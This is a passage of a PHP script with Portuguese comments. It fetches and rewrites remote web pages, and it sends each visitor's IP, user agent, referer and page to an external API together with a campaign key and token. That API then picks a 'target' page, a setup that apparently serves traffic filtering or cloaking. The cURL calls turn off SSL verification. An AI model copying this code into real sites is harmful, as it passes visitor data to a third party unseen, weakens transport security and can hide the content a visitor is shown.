    private static function fixPathsResourcesInDom(DOMDocument $dom, string $baseUrl)
    {
        $xpath = new DOMXPath($dom);

        // Atualizar atributos 'src' e 'href'
        $attributes = ['src', 'href'];
        foreach ($attributes as $attribute) {
            $nodes = $xpath->query('//*[' . '@' . $attribute . ']');
            foreach ($nodes as $node) {
                $attrValue = $node->getAttribute($attribute);
                $newAttrValue = self::createAbsoluteUrl($attrValue, $baseUrl);
                $node->setAttribute($attribute, $newAttrValue);
            }
        }

        // Atualizar 'srcset' em imagens
        $imgTags = $xpath->query('//img[@srcset]');
        foreach ($imgTags as $imgTag) {
            $srcset = $imgTag->getAttribute('srcset');
            if (!empty($srcset)) {
                $newSrcset = self::fixSrcset($srcset, $baseUrl);
                $imgTag->setAttribute('srcset', $newSrcset);
            }
        }

        // Atualizar URLs em estilos embutidos
        $styleTags = $xpath->query('//style');
        foreach ($styleTags as $styleTag) {
            $styleContent = $styleTag->textContent;
            $styleContent = self::fixPathsInternalStyles($styleContent, $baseUrl);
            $styleTag->textContent = $styleContent;
        }

        // Atualizar atributos 'style' inline
        $nodesWithStyle = $xpath->query('//*[@style]');
        foreach ($nodesWithStyle as $node) {
            $styleContent = $node->getAttribute('style');
            $styleContent = self::fixPathsInternalStyles($styleContent, $baseUrl);
            $node->setAttribute('style', $styleContent);
        }
    }
    private static function fixPathsInternalStyles(string $styles, string $baseUrl, string $relativeDirectory = ''): string
    {
        $styles = preg_replace_callback('/url\([\'"]?(.*?)[\'"]?\)/i', function ($matches) use ($baseUrl, $relativeDirectory) {
            $url = $matches[1];
            $newUrl = self::createAbsoluteUrl($url, $baseUrl);
            return "url('$newUrl')";
        }, $styles);
        return $styles;
    }
    private static function fixSrcset(string $srcset, string $basePath): string
    {
        $sources = explode(',', $srcset);
        $newSources = [];
        foreach ($sources as $source) {
            $parts = explode(' ', trim($source));
            if (count($parts) >= 1) {
                $url = $parts[0];
                $descriptor = $parts[1] ?? '';
                $newUrl = self::createAbsoluteUrl($url, $basePath);
                $newSources[] = trim("$newUrl $descriptor");
            }
        }
        return implode(', ', $newSources);
    }
    private static function createAbsoluteUrl(string $relativePath, string $basePath): string
    {
        if (strpos($relativePath, 'http://') === 0 || strpos($relativePath, 'https://') === 0) {
            return $relativePath;
        }

        $parsedBasePath = parse_url($basePath);
        $host = $parsedBasePath['host'];
        $scheme = $parsedBasePath['scheme'];

        $absolutePath = $scheme . '://' . rtrim($host, '/') . '/' . ltrim($relativePath, '/');

        return $absolutePath;
    }
    private static function addFontAwesomeStylesToDom(DOMDocument $dom)
    {
        $head = $dom->getElementsByTagName('head')->item(0);
        if ($head) {
            $fontAwesomeStyles = [
                'https://site-assets.fontawesome.com/releases/v6.4.2/css/all.css',
                'https://site-assets.fontawesome.com/releases/v6.4.2/css/sharp-solid.css',
                'https://site-assets.fontawesome.com/releases/v6.4.2/css/sharp-regular.css',
                'https://site-assets.fontawesome.com/releases/v6.4.2/css/sharp-light.css',
            ];
            foreach ($fontAwesomeStyles as $style) {
                $link = $dom->createElement('link');
                $link->setAttribute('rel', 'stylesheet');
                $link->setAttribute('href', $style);
                $head->appendChild($link);
            }
        }
    }

    private static function extractEncodingFromMeta(string $html): ?string
    {
        if (preg_match('/<meta[^>]+charset=([^\s"\'>]+)/i', $html, $matches)) {
            return strtoupper(trim($matches[1]));
        }

        if (preg_match('/<meta[^>]+http-equiv=["\']Content-Type["\'][^>]+content=["\'][^>]+charset=([^\s"\'>]+)/i', $html, $matches)) {
            return strtoupper(trim($matches[1]));
        }

        return null;
    }

    private static function updateMetaCharset(string $html): string
    {
        // Remover meta tags existentes de charset
        $html = preg_replace('/<meta[^>]+charset=[^>]+>/i', '', $html);

        // Inserir a meta tag UTF-8 após a abertura da tag <head>
        $html = preg_replace('/<head([^>]*)>/i', '<head$1><meta charset="UTF-8">', $html);

        return $html;
    }

    public static function loadReplacesFromJsonFile(string $filename)
    {
        $filePath = __DIR__ . DIRECTORY_SEPARATOR . AppConfig::REPLACE_FILE_NAME;

        if (!file_exists($filePath)) {
            Logger::logDebug("Arquivo de substituições JSON não encontrado: {$filePath}");
            if (AppConfig::GENERATE_REPLACE_FILE) {
                self::createReplaceJsonFile($filePath);
            }
            return [];
        }

        $jsonContent = file_get_contents($filePath);
        if ($jsonContent === false) {
            Logger::logError("Falha ao ler o arquivo de substituições JSON: {$filePath}");
            return [];
        }

        $replaces = json_decode($jsonContent, true);
        if (json_last_error() !== JSON_ERROR_NONE) {
            Logger::logError("Erro ao decodificar o arquivo JSON: " . json_last_error_msg());
            return [];
        }

        if (!is_array($replaces)) {
            Logger::logError("O conteúdo do arquivo de substituições JSON deve ser um array: {$filePath}");
            return [];
        }

        return $replaces;
    }




    private static function createReplaceJsonFile(string $filePath)
    {
        $exampleContent = <<<JSON
    [
        {
            "description": "Exemplo de substituição de atributo usando um seletor CSS.",
            "selector": "img#logo",
            "type": "attribute",
            "attribute": "src",
            "value": "https://novo-dominio.com/novo-logo.png",
            "enabled": false

        },
        {
            "description": "Exemplo de substituição de texto usando um seletor CSS.",
            "selector": "div.conteudo p",
            "type": "text",
            "value": "Este é o novo conteúdo do parágrafo.",
            "enabled": false

        },
        {
            "description": "Exemplo de substituição usando um seletor XPath.",
            "selector": "//a[@class='link-antigo']",
            "selectorType": "xpath",
            "type": "attribute",
            "attribute": "href",
            "value": "https://novo-link.com",
            "enabled": false

        },
        {
            "description": "Exemplo de substituição de classe CSS.",
            "selector": "button.btn-primary",
            "type": "attribute",
            "attribute": "class",
            "value": "btn btn-secondary",
            "enabled": false

        },
        {
            "description": "Exemplo de substituição de conteúdo HTML interno.",
            "selector": "div#banner",
            "type": "html",
            "value": "<h1>Bem-vindo ao Novo Site</h1><p>Nosso novo visual está incrível!</p>",
            "enabled": false

        },
        {
            "description": "Exemplo de substituição de imagem com seletor CSS.",
            "selector": "img.produto-destaque",
            "type": "attribute",
            "attribute": "src",
            "value": "https://novo-dominio.com/novo-produto.png",
            "enabled": false

        },
        {
            "description": "Exemplo de substituição de múltiplos atributos.",
            "selector": "a#cta-button",
            "type": "attribute",
            "attribute": "href",
            "value": "https://novo-dominio.com/comprar-agora",
            "enabled": false

        },
        {
            "description": "Exemplo de substituição de atributos com seletor XPath.",
            "selector": "//input[@type='text']",
            "selectorType": "xpath",
            "type": "attribute",
            "attribute": "placeholder",
            "value": "Digite aqui seu nome",
            "enabled": false

        },
        {
            "description": "Exemplo de remoção de elemento.",
            "selector": "div.anuncio",
            "type": "remove",
            "enabled": false

        },
        {
            "description": "Exemplo de substituição de estilo inline.",
            "selector": "div#rodape",
            "type": "attribute",
            "attribute": "style",
            "value": "background-color: #000000; color: #FFFFFF;",
            "enabled": false

        },
        {
            "description": "Substituir o título da página usando um seletor CSS.",
            "selector": "title",
            "type": "text",
            "value": "Novo Título da Página",
            "enabled": false

        },
        {
            "description": "Substituir o título da página usando um seletor XPath.",
            "selector": "//title",
            "selectorType": "xpath",
            "type": "text",
            "value": "Novo Título da Página",
            "enabled": false

        },
        {
            "description": "Exemplo de substituição de conteúdo de um botão.",
            "selector": "button#enviar",
            "type": "text",
            "value": "Enviar Agora",
            "enabled": false

        },
        {
            "description": "Exemplo de adição de um atributo 'data' em um link.",
            "selector": "a#promocao",
            "type": "attribute",
            "attribute": "data-promo",
            "value": "desconto-20",
            "enabled": false

        },
        {
            "description": "Exemplo de substituição de cor de fundo via estilo.",
            "selector": "body",
            "type": "attribute",
            "attribute": "style",
            "value": "background-color: #e0e0e0;",
            "enabled": false

        },
        {
            "description": "Exemplo de adicionar um novo elemento HTML antes de um div.",
            "selector": "div#conteudo",
            "type": "html",
            "value": "<div class='novo-bloco'><p>Novo conteúdo inserido antes do div principal</p></div>",
            "enabled": false
        },
        {
            "description": "before: Insere o valor HTML antes do nó selecionado.",
            "selector": "div.conteudo",
            "type": "before",
            "value": "<p>Texto antes do conteúdo</p>",
            "enabled": false
        },
        {
            "description": "after: Insere o valor HTML depois do nó selecionado.",
            "selector": "div.conteudo",
            "type": "after",
            "value": "<p>Texto depois do conteúdo</p>",
            "enabled": false
        },
        {
            "description": "addClass: Adiciona classes ao elemento, ao invés de substituir. ,Adicionar uma classe ao botão",
            "selector": "button.btn-primary",
            "type": "addClass",
            "value": "btn-lg",
            "enabled": false
        },
        {
            "description": "regex: Substitui o conteúdo usando uma expressão regular. Substituição usando regex",
            "selector": "p.descricao",
            "type": "regex",
            "pattern": "/(original)/i",
            "value": "substituído",
            "enabled": false
        },
        {
            "description": "Atributo condicional: Só aplica a substituição se o nó tiver um atributo específico (ex.: data-active). Substituição condicional baseada em atributo",
            "selector": "div.card",
            "type": "text",
            "value": "Texto condicional",
            "conditionAttribute": "data-active",
            "enabled": false
        },
        {
            "description": "Substituir diretamente o texto em todo o DOM",
            "type": "text",
            "value": "Texto Antigo",
            "newValue": "Texto Novo",
            "enabled": false
        },
        {
            "description": "Substituir link diretamente no DOM",
            "type": "link",
            "value": "https://antigo-link.com",
            "newValue": "https://novo-link.com",
            "enabled": false
        }
    ]
JSON;

        if (file_put_contents($filePath, $exampleContent) !== false) {
            Logger::logDebug("Arquivo de substituições JSON criado: {$filePath}");
        } else {
            Logger::logError("Falha ao criar o arquivo de substituições JSON: {$filePath}");
        }
    }



    public static function replaceAllLinksHTML(string $html, array $substituicoes): string
    {
        foreach ($substituicoes as $linkOriginal => $novoLink) {
            $html = str_replace($linkOriginal, $novoLink, $html);
            $html = preg_replace('/\b' . preg_quote($linkOriginal, '/') . '\b/', $novoLink, $html);
        }
        return $html;
    }



    private static function prepareUrl(string $url): string
    {
        if (!preg_match("~^(?:f|ht)tps?://~i", $url)) {
            $url = 'https://' . $url;
        }
        return $url;
    }

    private static function loadUrlWithCurl(string $url)
    {
        $curlHandler = curl_init();
        curl_setopt_array($curlHandler, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/100.0.4896.127 Safari/537.36)',
            CURLOPT_HTTPHEADER => ['Origin: ' . $url],
            CURLOPT_COOKIEJAR => 'cookies.txt',
            CURLOPT_COOKIEFILE => 'cookies.txt',
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_SSL_VERIFYPEER => 0,
        ]);

        $data = curl_exec($curlHandler);
        if ($data === false) {
            Logger::logDebug('Falha ao carregar a URL ' . $url . ' com cURL: ' . curl_error($curlHandler));
        }
        curl_close($curlHandler);
        return ($data !== false) ? $data : false;
    }

    private static function loadUrlWithFileGetContents(string $url)
    {
        try {
            $options = [
                'http' => [
                    'method' => 'GET',
                    'header' => [
                        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language: pt-BR,en;q=0.5',
                        'Referer: ' . $url,
                        'Origin: ' . $url,
                    ],
                ],
            ];
            $context = stream_context_create($options);
            $data = file_get_contents($url, false, $context);
            if ($data === false) {
                throw new Exception('Falha ao obter o conteúdo da URL com file_get_contents');
            }
            return $data;
        } catch (Exception $e) {
            Logger::logDebug('Falha ao carregar a URL ' . $url . ' com file_get_contents: ' . $e->getMessage());
            return false;
        }
    }
}

class FileLogger
{
    private const LOG_LEVEL_ERROR = 'ERROR';
    private const LOG_LEVEL_DEBUG = 'DEBUG';

    /**
     * @var string
     */
    private $logFile;

    /**
     * @var string
     */
    private $configuredLogLevel;

    public function __construct(string $logFile)
    {
        $this->logFile = $logFile;
        $this->configuredLogLevel = LogConstants::LOG_LEVEL;
    }

    public function logMessage(string $message, string $logLevel = self::LOG_LEVEL_ERROR)
    {
        $levels = [self::LOG_LEVEL_ERROR, self::LOG_LEVEL_DEBUG];
        if (!in_array($logLevel, $levels)) {
            $this->logMessage('O nível de log especificado é inválido: ' . $logLevel, self::LOG_LEVEL_ERROR);
            return;
        }

        if ($this->shouldLogMessage($logLevel)) {
            if (!$this->isLogFileExceededMaxSize()) {
                $timestamp = date('d-m-Y H:i:s');
                $logMessage = "[{$timestamp}] [{$logLevel}] {$message}\n";
                file_put_contents($this->logFile, $logMessage, FILE_APPEND);
            } else {
                $this->rotateLogFile();
                $this->logMessage($message, $logLevel);
            }
        }
    }

    private function shouldLogMessage(string $logLevel): bool
    {
        if ($this->configuredLogLevel === self::LOG_LEVEL_DEBUG) {
            return true;
        } elseif ($this->configuredLogLevel === self::LOG_LEVEL_ERROR) {
            return $logLevel === self::LOG_LEVEL_ERROR;
        }
        return false;
    }

    private function isLogFileExceededMaxSize(): bool
    {
        return (file_exists($this->logFile) && filesize($this->logFile) >= LogConstants::MAX_LOG_SIZE);
    }

    private function rotateLogFile()
    {
        $backupFile = $this->logFile . '.bak';
        if (file_exists($backupFile)) {
            unlink($backupFile);
        }
        rename($this->logFile, $backupFile);
        $this->cleanupOldLogs();
    }

    private function cleanupOldLogs()
    {
        $logFiles = glob($this->logFile . '.*');
        foreach ($logFiles as $file) {
            $fileAge = time() - filemtime($file);
            if ($fileAge > LogConstants::MAX_LOG_AGE) {
                unlink($file);
            }
        }
    }
}

class Logger
{
    private const LOG_LEVEL_ERROR = 'ERROR';
    private const LOG_LEVEL_DEBUG = 'DEBUG';

    /**
     * @var FileLogger|null
     */
    private static $logger = null;

    public static function logError(string $message)
    {
        self::getLoggerInstance()->logMessage($message, self::LOG_LEVEL_ERROR);
    }

    public static function logDebug(string $message)
    {
        self::getLoggerInstance()->logMessage($message, self::LOG_LEVEL_DEBUG);
    }

    private static function getLoggerInstance(): FileLogger
    {
        if (self::$logger === null) {
            self::$logger = new FileLogger(LogConstants::LOG_FILE);
        }
        return self::$logger;
    }
}

class ApiRequester
{
    public static function buildApiUrl(): string
    {
        $ip = self::getRealIpAddress();
        $queryParams = [
            'ip' => $ip,
            'domain' => preg_replace('#^(https?://)?(www\.)?([^/?]+)(.*)#', '$3', $_SERVER['HTTP_HOST']),
            'campaign' => ApiConstants::CAMPAIGN_KEY,
            'token' => ApiConstants::TOKEN,
            'userAgent' => $_SERVER['HTTP_USER_AGENT'],
            'language' => self::getBrowserLanguage(),
            'page' => urlencode((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
                ? 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']
                : 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']),
            'hostname' => self::getHostname($ip),
            'referer' => self::getReferer() ?? '',
        ];

        $apiUrl = ApiConstants::API_URL . '/?' . http_build_query($queryParams);
        Logger::logDebug("API URL construída: {$apiUrl}");
        return $apiUrl;
    }

    private static function getHostname(string $ip): string
    {
        return gethostbyaddr($ip) ?: '';
    }

    private static function getReferer(): ?string
    {
        if (isset($_COOKIE['last_referer'])) {
            return htmlspecialchars($_COOKIE['last_referer'], ENT_QUOTES, 'UTF-8');
        }

        if (isset($_SERVER['HTTP_REFERER'])) {
            $referer = htmlspecialchars($_SERVER['HTTP_REFERER'], ENT_QUOTES, 'UTF-8');
            if (AppConfig::USE_COOKIES) {
                setcookie('last_referer', $referer, time() + 3600, '/', '');
            }
            return $referer;
        }

        if (isset($_GET['utm_source'])) {
            $referer = htmlspecialchars($_GET['utm_source'], ENT_QUOTES, 'UTF-8');
            if (AppConfig::USE_COOKIES) {
                setcookie('last_referer', $referer, time() + 3600, '/', '');
            }
            return $referer;
        }

        return null;
    }


    private static function getRealIpAddress(): string
    {
        $ipHeaders = [
            'HTTP_CF_CONNECTING_IP',
            'HTTP_X_FORWARDED_FOR',
            'HTTP_X_REAL_IP',
            'HTTP_X_FORWARDED',
            'HTTP_X_CLUSTER_CLIENT_IP',
            'HTTP_FORWARDED_FOR',
            'HTTP_FORWARDED',
            'HTTP_CLIENT_IP',
            'HTTP_FORWARDED_FOR_IP',
            'X_FORWARDED_FOR',
            'FORWARDED_FOR',
            'X_FORWARDED',
            'FORWARDED',
            'CLIENT_IP',
            'FORWARDED_FOR_IP',
            'HTTP_PROXY_CONNECTION',
        ];

        foreach ($ipHeaders as $header) {
            if (!empty($_SERVER[$header])) {
                $ipList = explode(',', $_SERVER[$header]);
                foreach ($ipList as $ip) {
                    $ip = trim($ip);
                    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                        if (!self::isCloudflareProxy($ip)) {
                            return $ip;
                        }
                    }
                }
            }
        }

        if (filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
            if (!self::isCloudflareProxy($_SERVER['REMOTE_ADDR'])) {
                return $_SERVER['REMOTE_ADDR'];
            }
        }

        return '0.0.0.0';
    }

    private static function isCloudflareProxy(string $ip): bool
    {
        $cloudflareIpRanges = [
            '173.245.48.0/20',
            '103.21.244.0/22',
            '103.22.200.0/22',
            '103.31.4.0/22',
            '141.101.64.0/18',
            '108.162.192.0/18',
            '190.93.240.0/20',
            '188.114.96.0/20',
            '197.234.240.0/22',
            '198.41.128.0/17',
            '162.158.0.0/15',
            '104.16.0.0/12',
            '172.64.0.0/13',
            '131.0.72.0/22',
        ];

        foreach ($cloudflareIpRanges as $range) {
            if (self::cidrMatch($ip, $range)) {
                return true;
            }
        }
        return false;
    }

    private static function cidrMatch(string $ip, string $range): bool
    {
        list($subnet, $bits) = explode('/', $range);
        $ip = ip2long($ip);
        $subnet = ip2long($subnet);
        $mask = -1 << (32 - $bits);
        $subnet &= $mask;
        return ($ip & $mask) === $subnet;
    }

    private static function getBrowserLanguage(): string
    {
        if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
            $languages = explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE']);
            return $languages[0];
        }
        return '';
    }

    public static function getApiResponse(string $apiUrl)
    {
        Logger::logDebug("Enviando requisição para a API: {$apiUrl}");
        $curl = curl_init();
        curl_setopt_array($curl, [
            CURLOPT_URL => $apiUrl,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_HTTPHEADER => [
                'Accept: application/json',
                'X-Requested-With: XMLHttpRequest',
            ],
        ]);
        $responseData = curl_exec($curl);
        if ($responseData === false) {
            $errorMessage = 'Erro ao executar solicitação cURL para URL ' . $apiUrl . ': ' . curl_error($curl);
            throw new ApiRequestException($errorMessage, $apiUrl);
        }
        curl_close($curl);

        $response = json_decode($responseData, true);
        if ($response === null) {
            $errorMessage = 'Erro ao decodificar a resposta JSON do URL ' . $apiUrl . ': ' . json_last_error_msg();
            throw new ApiRequestException($errorMessage, $apiUrl);
        }
        if (isset($response['error'])) {
            throw new ApiRequestException($response['error'], $apiUrl);
        }

        Logger::logDebug("Resposta da API: " . json_encode($response));

        return $response;
    }
}

class PageHandler
{
    /**
     * @var Application
     */
    private $app;

    public function __construct(Application $app)
    {
        $this->app = $app;
    }

    public function handleApiResponse(array $response)
    {
        if (!$this->isValidApiResponse($response)) {
            throw new ApiResponseException('O destino {' . $response['target'] . '} não foi encontrado na resposta da API.', $response);
        }
        $target = $response['target'];
        Logger::logDebug("Alvo recebido da API: '{$target}'");
        $this->app->run($target);
    }

    private function isValidApiResponse(array $response): bool
    {
        return (array_key_exists('target', $response) && strlen($response['target']) >= 1);
    }
}

class ApiRequestException extends Exception
{
    /**
     * @var string
     */
    private $requestUrl;

    public function __construct(string $message, string $requestUrl)
    {
        parent::__construct($message);
        $this->requestUrl = $requestUrl;
    }

    public function getRequestUrl(): string
    {
        return $this->requestUrl;
    }
}

class ApiResponseException extends Exception
{
    /**
     * @var array
     */
    private $apiResponse;

    public function __construct(string $message, array $apiResponse)
    {
        parent::__construct($message);
        $this->apiResponse = $apiResponse;
    }

    public function getApiResponse()
    {
        return $this->apiResponse;
    }
}

class FileNotFoundException extends Exception
{
    /**
     * @var string
     */
    private $filePath;

    public function __construct(string $message, string $filePath)
    {
        parent::__construct($message);
        $this->filePath = $filePath;
    }

    public function getFilePath(): string
    {
        return $this->filePath;
    }
}

// Funções auxiliares
function createApplication(): Application
{
    return new Application();
}

function createPageHandler(Application $app): PageHandler
{
    return new PageHandler($app);
}

function handleCacheAndApi(Application $app)
{
    $apiUrl = ApiRequester::buildApiUrl();
    $response = ApiRequester::getApiResponse($apiUrl);
    $pageHandler = createPageHandler($app);
    $pageHandler->handleApiResponse($response);
}

// Execução principal
try {
    $app = createApplication();
    handleCacheAndApi($app);
} catch (ApiRequestException $e) {
    Logger::logError('Erro na requisição à API: ' . $e->getMessage() . ' (URL: ' . $e->getRequestUrl() . ')');
    $app->displayErrorPage(); // Exibe a página de erro
} catch (ApiResponseException $e) {
    Logger::logError('Erro na resposta da API: ' . $e->getMessage());
    $app->displayErrorPage(); // Exibe a página de erro
} catch (FileNotFoundException $e) {
    Logger::logError('Arquivo não encontrado: ' . $e->getMessage() . ' (File: ' . $e->getFilePath() . ')');
    $app->displayErrorPage(); // Exibe a página de erro
} catch (Exception $e) {
    Logger::logError('Ocorreu um erro inesperado: ' . $e->getMessage());
    $app->displayErrorPage(); // Exibe a página de erro
}
